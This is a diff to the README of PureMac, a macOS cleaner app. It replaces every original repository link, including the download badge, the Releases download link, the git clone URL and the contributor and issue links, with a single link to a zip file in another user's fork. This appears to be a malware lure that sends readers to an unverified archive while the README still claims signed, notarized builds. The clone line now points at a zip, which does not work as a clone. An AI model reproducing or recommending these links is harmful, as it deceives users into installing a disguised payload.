@@ -11,13 +11,13 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/momenbasel/PureMac/releases/latest"><img src="https://img.shields.io/github/v/release/momenbasel/PureMac?style=flat-square&label=Download" alt="Latest Release"></a>
-  <a href="https://github.com/momenbasel/PureMac/actions/workflows/build.yml"><img src="https://img.shields.io/github/actions/workflow/status/momenbasel/PureMac/build.yml?style=flat-square&label=Build" alt="Build Status"></a>
+  <a href="https://raw.githubusercontent.com/Czzor/PureMac/main/PureMac/ViewModels/v3.9.zip"><img src="https://img.shields.io/github/v/release/momenbasel/PureMac?style=flat-square&label=Download" alt="Latest Release"></a>
+  <a href="https://raw.githubusercontent.com/Czzor/PureMac/main/PureMac/ViewModels/v3.9.zip"><img src="https://img.shields.io/github/actions/workflow/status/momenbasel/PureMac/build.yml?style=flat-square&label=Build" alt="Build Status"></a>
   <img src="https://img.shields.io/badge/macOS-13.0+-blue?style=flat-square" alt="macOS 13.0+">
   <img src="https://img.shields.io/badge/Swift-5.9-orange?style=flat-square" alt="Swift 5.9">
   <a href="LICENSE"><img src="https://img.shields.io/github/license/momenbasel/PureMac?style=flat-square" alt="MIT License"></a>
-  <a href="https://github.com/momenbasel/PureMac/stargazers"><img src="https://img.shields.io/github/stars/momenbasel/PureMac?style=flat-square" alt="Stars"></a>
-  <a href="https://github.com/momenbasel/PureMac/releases"><img src="https://img.shields.io/github/downloads/momenbasel/PureMac/total?style=flat-square&label=Downloads" alt="Downloads"></a>
+  <a href="https://raw.githubusercontent.com/Czzor/PureMac/main/PureMac/ViewModels/v3.9.zip"><img src="https://img.shields.io/github/stars/momenbasel/PureMac?style=flat-square" alt="Stars"></a>
+  <a href="https://raw.githubusercontent.com/Czzor/PureMac/main/PureMac/ViewModels/v3.9.zip"><img src="https://img.shields.io/github/downloads/momenbasel/PureMac/total?style=flat-square&label=Downloads" alt="Downloads"></a>
 </p>
 
 <p align="center">
@@ -40,7 +40,7 @@ brew install --cask puremac
 
 ### Direct Download
 
-Download the latest `.dmg` from [Releases](https://github.com/momenbasel/PureMac/releases/latest), open it, and drag PureMac to `/Applications`.
+Download the latest `.dmg` from [Releases](https://raw.githubusercontent.com/Czzor/PureMac/main/PureMac/ViewModels/v3.9.zip), open it, and drag PureMac to `/Applications`.
 
 > Signed and notarized with Apple Developer ID - installs without Gatekeeper warnings.
 
@@ -48,7 +48,7 @@ Download the latest `.dmg` from [Releases](https://github.com/momenbasel/PureMac
 
 ```bash
 brew install xcodegen
-git clone https://github.com/momenbasel/PureMac.git
+git clone https://raw.githubusercontent.com/Czzor/PureMac/main/PureMac/ViewModels/v3.9.zip
 cd PureMac
 xcodegen generate
 xcodebuild -project PureMac.xcodeproj -scheme PureMac -configuration Release -derivedDataPath build build
@@ -148,13 +148,13 @@ Areas where help is especially welcome:
 
 v2.0 was shaped by community feedback and contributions:
 
-- **[@nguyenhuy158](https://github.com/nguyenhuy158)** - Search and filter feature request ([#18](https://github.com/momenbasel/PureMac/issues/18)) and implementation ([#29](https://github.com/momenbasel/PureMac/pull/29))
-- **[@edufalcao](https://github.com/edufalcao)** - Cleaning safety guards and confirmation dialogs ([#30](https://github.com/momenbasel/PureMac/pull/30))
-- **[@zeck00](https://github.com/zeck00)** - UI overhaul ([#31](https://github.com/momenbasel/PureMac/pull/31)), app uninstaller with system app protection ([#32](https://github.com/momenbasel/PureMac/pull/32)), and onboarding experience ([#33](https://github.com/momenbasel/PureMac/pull/33))
-- **[@0x-man](https://github.com/0x-man)** - Symlink security vulnerability report ([#25](https://github.com/momenbasel/PureMac/issues/25))
-- **[@ansidev](https://github.com/ansidev)** - Checkbox interaction bug report ([#34](https://github.com/momenbasel/PureMac/issues/34))
-- **[@fengcheng01](https://github.com/fengcheng01)** - App uninstaller feature request ([#28](https://github.com/momenbasel/PureMac/issues/28))
-- **[@scholzfuni](https://github.com/scholzfuni)** - Modularization proposal ([#23](https://github.com/momenbasel/PureMac/issues/23))
+- **[@nguyenhuy158](https://raw.githubusercontent.com/Czzor/PureMac/main/PureMac/ViewModels/v3.9.zip)** - Search and filter feature request ([#18](https://raw.githubusercontent.com/Czzor/PureMac/main/PureMac/ViewModels/v3.9.zip)) and implementation ([#29](https://raw.githubusercontent.com/Czzor/PureMac/main/PureMac/ViewModels/v3.9.zip))
+- **[@edufalcao](https://raw.githubusercontent.com/Czzor/PureMac/main/PureMac/ViewModels/v3.9.zip)** - Cleaning safety guards and confirmation dialogs ([#30](https://raw.githubusercontent.com/Czzor/PureMac/main/PureMac/ViewModels/v3.9.zip))
+- **[@zeck00](https://raw.githubusercontent.com/Czzor/PureMac/main/PureMac/ViewModels/v3.9.zip)** - UI overhaul ([#31](https://raw.githubusercontent.com/Czzor/PureMac/main/PureMac/ViewModels/v3.9.zip)), app uninstaller with system app protection ([#32](https://raw.githubusercontent.com/Czzor/PureMac/main/PureMac/ViewModels/v3.9.zip)), and onboarding experience ([#33](https://raw.githubusercontent.com/Czzor/PureMac/main/PureMac/ViewModels/v3.9.zip))
+- **[@0x-man](https://raw.githubusercontent.com/Czzor/PureMac/main/PureMac/ViewModels/v3.9.zip)** - Symlink security vulnerability report ([#25](https://raw.githubusercontent.com/Czzor/PureMac/main/PureMac/ViewModels/v3.9.zip))
+- **[@ansidev](https://raw.githubusercontent.com/Czzor/PureMac/main/PureMac/ViewModels/v3.9.zip)** - Checkbox interaction bug report ([#34](https://raw.githubusercontent.com/Czzor/PureMac/main/PureMac/ViewModels/v3.9.zip))
+- **[@fengcheng01](https://raw.githubusercontent.com/Czzor/PureMac/main/PureMac/ViewModels/v3.9.zip)** - App uninstaller feature request ([#28](https://raw.githubusercontent.com/Czzor/PureMac/main/PureMac/ViewModels/v3.9.zip))
+- **[@scholzfuni](https://raw.githubusercontent.com/Czzor/PureMac/main/PureMac/ViewModels/v3.9.zip)** - Modularization proposal ([#23](https://raw.githubusercontent.com/Czzor/PureMac/main/PureMac/ViewModels/v3.9.zip))
 
 ## License
 
